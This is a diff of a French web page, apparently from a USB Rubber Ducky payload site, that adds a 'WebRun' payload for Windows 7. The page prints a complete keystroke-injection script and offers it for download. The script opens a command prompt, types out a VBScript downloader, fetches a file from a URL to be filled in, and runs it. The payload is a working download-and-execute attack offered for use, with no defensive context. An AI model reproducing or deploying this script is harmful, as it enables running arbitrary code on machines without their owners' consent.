@@ -96,33 +96,77 @@
 
   <!--Main layout-->
   <main class="mt-5 pt-5">
-  </br>
     <div class="container">
-      <h1 class="h1 ducky-blue-text">Executer une application depuis internet</h1>
-      </br>
-      <div class="row">
-        <div class="col-sm">
-          <h3 class="h3 ducky-blue-text">Informations </h3>
-          </br>
-          <div>
-            <h4 class="h4 ducky-blue-text">Système(s) d'exploitation </h4>
-            <p class="ducky-blue-text">Windows 7</p>
-          </div>
-          <div>
-          <h4 class="h4 ducky-blue-text">Fonctionnalité </h4>
-            <p class="ducky-blue-text">Avec ce script, tu pourras télécharger puis executer les applications de ton choix depuis Internet! </br>Le script ouvre d'abord une interface de commande, puis génère un vbscript qui pourra, dans la machine, télécharger puis executer un document depuis une n'importe quelle adresse URL.</p>
-          </div>
-          <div>
-            <h4 class="h4 ducky-blue-text">Déroulement du script</h4>
-            <p class="ducky-blue-text">Etape 1</p>
-            <p class="ducky-blue-text">Etape 2</p>
-            <p class="ducky-blue-text">Etape 3</p>
-          </div>
+      
+      <h3 class="ducky-blue-text pb-4">WebRun</h3>
+
+      <div>
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
+          <p class="ducky-blue-text"><i class="fab fa-windows"></i> Windows 7</p>
         </div>
-        <div class="col-sm">
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
+          <p class="ducky-blue-text">Télécharge puis exécute une application depuis Internet.</p>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+
+          <ol>
+            <li class="ducky-blue-text">Ouverture de l'invité de commande</li>
+            <li class="ducky-blue-text">Création d'un script VBS qui téléchargera puis exécutera une application depuis Internet</li>
+            <li class="ducky-blue-text">Lancement du script VBS</li>
+            <li class="ducky-blue-text">Lancement de l'application téléchargée</li>
+          </ol>
+        </div>
+
+        <div class="text-center py-4">
           <a href="../resources/scripts/dh-webrun.txt" download>
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Le script :</h4>
+
+          <pre class="line-numbers mdb-color darken-3"><code>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+            <span class="new-line blue-text">ESCAPE</span>
+            <span class="new-line blue-text">CONTROL ESCAPE</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cmd</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> copy con download.vbs</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> If objXMLHTTP.Status = 200 Then</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line blue-text">CTRL Z</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cscript download.vbs [URL DE L'APPLICATION ICI]</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> [NOM DE L'APPLICATION ICI]</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
+            <span class="new-line blue-text">ENTER</span>
+          </code></pre>
         </div>
       </div>
     </div>
